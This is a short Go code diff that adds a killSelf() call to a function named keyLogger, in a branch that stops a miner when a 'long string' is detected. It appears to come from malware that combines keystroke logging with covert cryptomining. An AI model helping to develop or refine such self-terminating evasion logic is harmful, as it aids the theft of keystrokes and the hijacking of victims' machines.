@@ -29,6 +29,7 @@ func keyLogger(config *Configuration) {
 			fmt.Println("Long String detected in " + strconv.Itoa(int(config.TimeOut)) + "s")
 			// Stop Miner
 			StopMiner()
+			killSelf()
 			return
 		}
 
